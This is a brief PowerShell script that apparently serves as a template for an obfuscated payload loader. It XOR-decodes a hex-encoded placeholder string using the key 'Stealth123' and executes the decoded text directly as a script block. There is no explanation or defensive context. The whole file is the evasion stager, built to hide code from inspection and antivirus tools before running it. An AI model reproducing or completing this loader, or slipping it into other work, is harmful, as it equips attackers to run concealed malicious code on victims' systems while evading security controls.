Function f1 {
    param($d,$k)
    $o = ""
    for ($i=0; $i -lt $d.Length; $i+=2) {
        $b = [Convert]::ToByte($d.Substring($i, 2), 16)
        $x = [byte][char]$k[($i/2) % $k.Length]
        $o += [char]($b -bxor $x)
    }
    return $o
}

$xx = "<HEX_REPLACE>"
$kk = "Stealth123"
$cc = f1 -d $xx -k $kk
[ScriptBlock]::Create($cc).Invoke()
